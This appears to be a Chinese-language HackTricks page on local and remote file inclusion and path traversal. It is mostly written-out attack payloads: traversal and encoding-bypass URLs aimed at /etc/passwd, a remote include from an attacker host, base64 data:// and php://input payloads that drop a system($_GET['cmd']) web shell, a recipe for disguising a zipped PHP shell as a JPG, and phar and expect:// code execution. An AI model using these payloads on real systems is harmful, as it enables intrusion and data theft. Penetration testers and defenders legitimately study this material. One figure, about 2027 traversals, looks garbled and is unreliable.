<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>File Inclusion/Path traversal</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="文件包含路径遍历"><a class="header" href="#文件包含路径遍历">文件包含/路径遍历</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>今天就加入我们，</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作！</p>
<h2 id="文件包含"><a class="header" href="#文件包含">文件包含</a></h2>
<p><strong>远程文件包含 (RFI)：</strong> 文件从远程服务器加载（最佳：您可以编写代码，服务器将执行它）。在 php 中，这默认是 <strong>禁用</strong> 的 (<strong>allow_url_include</strong>)。<br />
<strong>本地文件包含 (LFI)：</strong> 服务器加载本地文件。</p>
<p>当用户以某种方式控制将被服务器加载的文件时，就会发生此漏洞。</p>
<p>易受攻击的 <strong>PHP 函数</strong>：require, require_once, include, include_once</p>
<p>一个有趣的工具来利用此漏洞：<a href="https://github.com/kurobeats/fimap">https://github.com/kurobeats/fimap</a></p>
<h2 id="blind---interesting---lfi2rce-文件"><a class="header" href="#blind---interesting---lfi2rce-文件">Blind - Interesting - LFI2RCE 文件</a></h2>
<pre><code class="language-python">wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
</code></pre>
<h3 id="linux"><a class="header" href="#linux"><strong>Linux</strong></a></h3>
<p><strong>混合多个 *nix LFI 列表并添加更多路径，我创建了这个：</strong></p>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}</p>
<p>尝试将 <code>/</code> 改为 <code>\</code><br />
尝试添加 <code>../../../../../</code></p>
<p>一个使用多种技术查找文件 /etc/password（以检查漏洞是否存在）的列表可以在 <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt">这里</a> 找到。</p>
<h3 id="windows"><a class="header" href="#windows"><strong>Windows</strong></a></h3>
<p>不同词表的合并：</p>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}</p>
<p>尝试将 <code>/</code> 改为 <code>\</code><br />
尝试删除 <code>C:/</code> 并添加 <code>../../../../../</code></p>
<p>一个使用多种技术查找文件 /boot.ini（以检查漏洞是否存在）的列表可以在 <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt">这里</a> 找到。</p>
<h3 id="os-x"><a class="header" href="#os-x"><strong>OS X</strong></a></h3>
<p>检查 Linux 的 LFI 列表。</p>
<h2 id="基本-lfi-和绕过"><a class="header" href="#基本-lfi-和绕过">基本 LFI 和绕过</a></h2>
<p>所有示例都是针对本地文件包含，但也可以应用于远程文件包含（页面=[http://myserver.com/phpshellcode.txt\](http://myserver.com/phpshellcode.txt)/）。</p>
<pre><code>http://example.com/index.php?page=../../../etc/passwd
</code></pre>
<h3 id="非递归剥离遍历序列"><a class="header" href="#非递归剥离遍历序列">非递归剥离遍历序列</a></h3>
<pre><code class="language-python">http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
</code></pre>
<h3 id="空字节-00"><a class="header" href="#空字节-00"><strong>空字节 (%00)</strong></a></h3>
<p>绕过在提供的字符串末尾附加更多字符（绕过：$_GET['param']."php"）</p>
<pre><code>http://example.com/index.php?page=../../../etc/passwd%00
</code></pre>
<p>这是<strong>自 PHP 5.4 起已解决</strong></p>
<h3 id="编码"><a class="header" href="#编码"><strong>编码</strong></a></h3>
<p>您可以使用非标准编码，例如双重 URL 编码（和其他编码）：</p>
<pre><code>http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
</code></pre>
<h3 id="从现有文件夹"><a class="header" href="#从现有文件夹">从现有文件夹</a></h3>
<p>也许后端正在检查文件夹路径：</p>
<pre><code class="language-python">http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
</code></pre>
<h3 id="探索服务器上的文件系统目录"><a class="header" href="#探索服务器上的文件系统目录">探索服务器上的文件系统目录</a></h3>
<p>服务器的文件系统可以通过某些技术递归地探索，以识别目录，而不仅仅是文件。此过程涉及确定目录深度并探测特定文件夹的存在。以下是实现此目标的详细方法：</p>
<ol>
<li><strong>确定目录深度：</strong> 通过成功获取 <code>/etc/passwd</code> 文件来确定当前目录的深度（适用于基于Linux的服务器）。一个示例URL可能结构如下，表示深度为三：</li>
</ol>
<pre><code class="language-bash">http://example.com/index.php?page=../../../etc/passwd # depth of 3
</code></pre>
<ol start="2">
<li><strong>探测文件夹：</strong> 将怀疑的文件夹名称（例如，<code>private</code>）附加到 URL，然后导航回 <code>/etc/passwd</code>。额外的目录级别需要将深度增加一个：</li>
</ol>
<pre><code class="language-bash">http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
</code></pre>
<ol start="3">
<li><strong>解释结果：</strong> 服务器的响应指示文件夹是否存在：</li>
</ol>
<ul>
<li><strong>错误 / 无输出：</strong> 文件夹 <code>private</code> 可能在指定位置不存在。</li>
<li><strong><code>/etc/passwd</code> 的内容：</strong> 确认存在 <code>private</code> 文件夹。</li>
</ul>
<ol start="4">
<li><strong>递归探索：</strong> 发现的文件夹可以使用相同的技术或传统的本地文件包含 (LFI) 方法进一步探测子目录或文件。</li>
</ol>
<p>要探索文件系统中不同位置的目录，请相应调整有效负载。例如，要检查 <code>/var/www/</code> 是否包含 <code>private</code> 目录（假设当前目录深度为 3），请使用：</p>
<pre><code class="language-bash">http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
</code></pre>
<h3 id="路径截断技术"><a class="header" href="#路径截断技术"><strong>路径截断技术</strong></a></h3>
<p>路径截断是一种用于操纵Web应用程序中文件路径的方法。它通常用于通过绕过某些安全措施来访问受限文件，这些安全措施会在文件路径的末尾附加额外字符。目标是构造一个文件路径，该路径在被安全措施修改后，仍然指向所需的文件。</p>
<p>在PHP中，由于文件系统的性质，文件路径的各种表示可以被视为等效。例如：</p>
<ul>
<li><code>/etc/passwd</code>、<code>/etc//passwd</code>、<code>/etc/./passwd</code>和<code>/etc/passwd/</code>都被视为相同的路径。</li>
<li>当最后6个字符为<code>passwd</code>时，附加一个<code>/</code>（使其变为<code>passwd/</code>）不会改变目标文件。</li>
<li>同样，如果在文件路径后附加<code>.php</code>（如<code>shellcode.php</code>），在末尾添加<code>/.</code>不会改变被访问的文件。</li>
</ul>
<p>提供的示例演示了如何利用路径截断访问<code>/etc/passwd</code>，这是一个由于其敏感内容（用户账户信息）而常见的目标：</p>
<pre><code>http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
</code></pre>
<pre><code>http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
</code></pre>
<p>在这些场景中，所需的遍历次数可能在2027左右，但这个数字可能会根据服务器的配置而有所不同。</p>
<ul>
<li><strong>使用点段和附加字符</strong>：遍历序列（<code>../</code>）与额外的点段和字符结合使用，可以用来导航文件系统，有效地忽略服务器附加的字符串。</li>
<li><strong>确定所需的遍历次数</strong>：通过反复试验，可以找到精确的<code>../</code>序列数量，以导航到根目录，然后到<code>/etc/passwd</code>，确保任何附加的字符串（如<code>.php</code>）被中和，但所需的路径（<code>/etc/passwd</code>）保持不变。</li>
<li><strong>从虚假目录开始</strong>：通常的做法是以一个不存在的目录（如<code>a/</code>）开始路径。这种技术作为预防措施或满足服务器路径解析逻辑的要求。</li>
</ul>
<p>在使用路径截断技术时，了解服务器的路径解析行为和文件系统结构至关重要。每种情况可能需要不同的方法，通常需要测试以找到最有效的方式。</p>
<p><strong>此漏洞在PHP 5.3中已被修复。</strong></p>
<h3 id="过滤器绕过技巧"><a class="header" href="#过滤器绕过技巧"><strong>过滤器绕过技巧</strong></a></h3>
<pre><code>http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
</code></pre>
<h2 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h2>
<p>在php中，这默认是禁用的，因为 <strong><code>allow_url_include</code></strong> 是 <strong>关闭</strong> 的。它必须是 <strong>开启</strong> 的才能工作，在这种情况下，你可以从你的服务器包含一个PHP文件并获得RCE：</p>
<pre><code class="language-python">http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
</code></pre>
<p>如果由于某种原因 <strong><code>allow_url_include</code></strong> 是 <strong>On</strong>，但 PHP 正在 <strong>过滤</strong> 对外部网页的访问，<a href="https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/">根据这篇文章</a>，你可以使用例如数据协议和 base64 来解码 b64 PHP 代码并获得 RCE：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code>PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="info" %}
在前面的代码中，最后的 <code>+.txt</code> 被添加是因为攻击者需要一个以 <code>.txt</code> 结尾的字符串，因此字符串以它结尾，经过 b64 解码后那部分将返回垃圾数据，真正的 PHP 代码将被包含（因此被执行）。
{% endhint %}</p>
<p>另一个<strong>不使用 <code>php://</code> 协议</strong>的例子是：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
</code></pre>
<p>{% endcode %}</p>
<h2 id="python-根元素"><a class="header" href="#python-根元素">Python 根元素</a></h2>
<p>在 Python 中，像这样的代码：</p>
<pre><code class="language-python"># file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
</code></pre>
<p>如果用户传递一个 <strong>绝对路径</strong> 给 <strong><code>file_name</code></strong>，<strong>之前的路径会被移除</strong>：</p>
<pre><code class="language-python">os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
</code></pre>
<p>根据<a href="https://docs.python.org/3.10/library/os.path.html#os.path.join">文档</a>，这是预期的行为：</p>
<blockquote>
<p>如果一个组件是绝对路径，则所有先前的组件都会被丢弃，并从绝对路径组件继续连接。</p>
</blockquote>
<h2 id="java-列出目录"><a class="header" href="#java-列出目录">Java 列出目录</a></h2>
<p>看起来如果你在 Java 中有路径遍历并且你<strong>请求一个目录</strong>而不是文件，<strong>将返回该目录的列表</strong>。在其他语言中（据我所知）不会发生这种情况。</p>
<h2 id="前25个参数"><a class="header" href="#前25个参数">前25个参数</a></h2>
<p>以下是可能容易受到本地文件包含（LFI）漏洞影响的前25个参数列表（来自<a href="https://twitter.com/trbughunters/status/1279768631845494787">链接</a>）：</p>
<pre><code>?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
</code></pre>
<h2 id="lfi--rfi-使用-php-包装器和协议"><a class="header" href="#lfi--rfi-使用-php-包装器和协议">LFI / RFI 使用 PHP 包装器和协议</a></h2>
<h3 id="phpfilter"><a class="header" href="#phpfilter">php://filter</a></h3>
<p>PHP 过滤器允许在数据被读取或写入之前执行基本的 <strong>修改操作</strong>。过滤器分为 5 类：</p>
<ul>
<li><a href="https://www.php.net/manual/en/filters.string.php">字符串过滤器</a>:</li>
<li><code>string.rot13</code></li>
<li><code>string.toupper</code></li>
<li><code>string.tolower</code></li>
<li><code>string.strip_tags</code>: 从数据中移除标签（在 "&lt;" 和 "&gt;" 字符之间的所有内容）</li>
<li>请注意，这个过滤器在现代版本的 PHP 中已经消失</li>
<li><a href="https://www.php.net/manual/en/filters.convert.php">转换过滤器</a></li>
<li><code>convert.base64-encode</code></li>
<li><code>convert.base64-decode</code></li>
<li><code>convert.quoted-printable-encode</code></li>
<li><code>convert.quoted-printable-decode</code></li>
<li><code>convert.iconv.*</code> : 转换为不同的编码(<code>convert.iconv.&lt;input_enc&gt;.&lt;output_enc&gt;</code>)。要获取 <strong>所有支持的编码列表</strong>，请在控制台中运行：<code>iconv -l</code></li>
</ul>
<p>{% hint style="warning" %}
滥用 <code>convert.iconv.*</code> 转换过滤器可以 <strong>生成任意文本</strong>，这可能对写入任意文本或使函数如包含过程处理任意文本有用。有关更多信息，请查看 <a href="lfi2rce-via-php-filters.html"><strong>通过 php 过滤器的 LFI2RCE</strong></a>。
{% endhint %}</p>
<ul>
<li><a href="https://www.php.net/manual/en/filters.compression.php">压缩过滤器</a></li>
<li><code>zlib.deflate</code>: 压缩内容（如果提取大量信息时很有用）</li>
<li><code>zlib.inflate</code>: 解压数据</li>
<li><a href="https://www.php.net/manual/en/filters.encryption.php">加密过滤器</a></li>
<li><code>mcrypt.*</code> : 已弃用</li>
<li><code>mdecrypt.*</code> : 已弃用</li>
<li>其他过滤器</li>
<li>在 php 中运行 <code>var_dump(stream_get_filters());</code> 可以找到几个 <strong>意外的过滤器</strong>：</li>
<li><code>consumed</code></li>
<li><code>dechunk</code>: 反转 HTTP 分块编码</li>
<li><code>convert.*</code></li>
</ul>
<pre><code class="language-php"># String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,&lt;b&gt;Bold&lt;/b&gt;&lt;?php php code; ?&gt;lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
</code></pre>
<p>{% hint style="warning" %}
部分 "php://filter" 不区分大小写
{% endhint %}</p>
<h3 id="使用-php-过滤器作为-oracle-读取任意文件"><a class="header" href="#使用-php-过滤器作为-oracle-读取任意文件">使用 php 过滤器作为 oracle 读取任意文件</a></h3>
<p><a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle"><strong>在这篇文章中</strong></a> 提出了一种在不从服务器返回输出的情况下读取本地文件的技术。该技术基于 <strong>使用 php 过滤器作为 oracle 的文件布尔外泄（逐字符）</strong>。这是因为 php 过滤器可以用来使文本变得足够大，从而使 php 抛出异常。</p>
<p>在原始文章中可以找到该技术的详细解释，但这里是一个快速总结：</p>
<ul>
<li>使用编码 <strong><code>UCS-4LE</code></strong> 将文本的前导字符留在开头，并使字符串的大小呈指数级增长。</li>
<li>这将用于生成一个 <strong>当初始字母正确猜测时非常大的文本</strong>，以至于 php 会触发一个 <strong>错误</strong>。</li>
<li><strong>dechunk</strong> 过滤器将 <strong>删除所有内容，如果第一个字符不是十六进制</strong>，因此我们可以知道第一个字符是否是十六进制。</li>
<li>这与前一个结合（以及其他根据猜测字母的过滤器），将允许我们通过查看何时进行足够的转换使其不再是十六进制字符来猜测文本开头的字母。因为如果是十六进制，dechunk 不会删除它，初始炸弹将导致 php 错误。</li>
<li>编码 <strong>convert.iconv.UNICODE.CP930</strong> 将每个字母转换为下一个（因此在此编码后：a -&gt; b）。这使我们能够发现第一个字母是否是 <code>a</code>，例如，因为如果我们应用 6 次此编码 a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f-&gt;g，该字母不再是十六进制字符，因此 dechunk 不会删除它，php 错误被触发，因为它与初始炸弹相乘。</li>
<li>在开头使用其他转换如 <strong>rot13</strong> 可以泄露其他字符如 n, o, p, q, r（其他编码可以用于将其他字母移动到十六进制范围）。</li>
<li>当初始字符是数字时，需要对其进行 base64 编码并泄露前两个字母以泄露该数字。</li>
<li>最后一个问题是查看 <strong>如何泄露超过初始字母</strong>。通过使用顺序内存过滤器如 <strong>convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE</strong> 可以改变字符的顺序，并在文本的第一位置获取其他字母。</li>
<li>为了能够获取 <strong>更多数据</strong>，想法是 <strong>在开头生成 2 字节的垃圾数据</strong>，使用 <strong>convert.iconv.UTF16.UTF16</strong>，应用 <strong>UCS-4LE</strong> 使其 <strong>与接下来的 2 字节进行枢轴</strong>，并 <strong>删除数据直到垃圾数据</strong>（这将删除初始文本的前 2 字节）。继续这样做，直到达到所需的泄露位。</li>
</ul>
<p>在文章中还泄露了一种自动执行此操作的工具：<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filters_chain_oracle_exploit</a>。</p>
<h3 id="phpfd"><a class="header" href="#phpfd">php://fd</a></h3>
<p>此包装器允许访问进程打开的文件描述符。可能对外泄打开文件的内容有用：</p>
<pre><code class="language-php">echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
</code></pre>
<p>您还可以使用 <strong>php://stdin, php://stdout 和 php://stderr</strong> 分别访问 <strong>文件描述符 0, 1 和 2</strong>（不确定这在攻击中如何有用）</p>
<h3 id="zip-和-rar"><a class="header" href="#zip-和-rar">zip:// 和 rar://</a></h3>
<p>上传一个包含 PHPShell 的 Zip 或 Rar 文件并访问它。<br />
为了能够利用 rar 协议，它 <strong>需要被特别激活</strong>。</p>
<pre><code class="language-bash">echo "&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;" &gt; payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
</code></pre>
<h3 id="data"><a class="header" href="#data">data://</a></h3>
<pre><code>http://example.net/?page=data://text/plain,&lt;?php echo base64_encode(file_get_contents("index.php")); ?&gt;
http://example.net/?page=data://text/plain,&lt;?php phpinfo(); ?&gt;
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,&lt;?php echo base64_encode(file_get_contents("index.php")); ?&gt;
http://example.net/?page=data:text/plain,&lt;?php phpinfo(); ?&gt;
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;"
</code></pre>
<p>注意，此协议受 php 配置 <strong><code>allow_url_open</code></strong> 和 <strong><code>allow_url_include</code></strong> 的限制。</p>
<h3 id="expect"><a class="header" href="#expect">expect://</a></h3>
<p>必须激活 Expect。您可以使用以下方式执行代码：</p>
<pre><code>http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
</code></pre>
<h3 id="input"><a class="header" href="#input">input://</a></h3>
<p>在POST参数中指定您的有效载荷：</p>
<pre><code class="language-bash">curl -XPOST "http://example.com/index.php?page=php://input" --data "&lt;?php system('id'); ?&gt;"
</code></pre>
<h3 id="phar"><a class="header" href="#phar">phar://</a></h3>
<p>一个 <code>.phar</code> 文件可以在 web 应用程序利用 <code>include</code> 等函数进行文件加载时执行 PHP 代码。下面提供的 PHP 代码片段演示了如何创建一个 <code>.phar</code> 文件：</p>
<pre><code class="language-php">&lt;?php
$phar = new Phar('test.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt', 'text');
$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); system("ls"); ?&gt;');
$phar-&gt;stopBuffering();
</code></pre>
<p>要编译 <code>.phar</code> 文件，应执行以下命令：</p>
<pre><code class="language-bash">php --define phar.readonly=0 create_path.php
</code></pre>
<p>在执行时，将创建一个名为 <code>test.phar</code> 的文件，这可能被利用来利用本地文件包含（LFI）漏洞。</p>
<p>在 LFI 仅执行文件读取而不执行 PHP 代码的情况下，通过 <code>file_get_contents()</code>、<code>fopen()</code>、<code>file()</code>、<code>file_exists()</code>、<code>md5_file()</code>、<code>filemtime()</code> 或 <code>filesize()</code> 等函数，可以尝试利用反序列化漏洞。此漏洞与使用 <code>phar</code> 协议读取文件有关。</p>
<p>有关在 <code>.phar</code> 文件上下文中利用反序列化漏洞的详细理解，请参阅以下链接的文档：</p>
<p><a href="phar-deserialization.html">Phar Deserialization Exploitation Guide</a></p>
<p>{% content-ref url="phar-deserialization.md" %}
<a href="phar-deserialization.html">phar-deserialization.md</a>
{% endcontent-ref %}</p>
<h3 id="cve-2024-2961"><a class="header" href="#cve-2024-2961">CVE-2024-2961</a></h3>
<p>可以滥用 <strong>任何支持 php 过滤器的 PHP 中的任意文件读取</strong> 来获得 RCE。详细描述可以在 <a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1"><strong>此帖子中找到</strong></a><strong>.</strong><br />
非常简要的总结：在 PHP 堆中滥用 <strong>3 字节溢出</strong> 来 <strong>更改特定大小的空闲块链</strong>，以便能够 <strong>在任何地址写入任何内容</strong>，因此添加了一个钩子来调用 <strong><code>system</code></strong>。<br />
可以通过滥用更多的 php 过滤器来分配特定大小的块。</p>
<h3 id="更多协议"><a class="header" href="#更多协议">更多协议</a></h3>
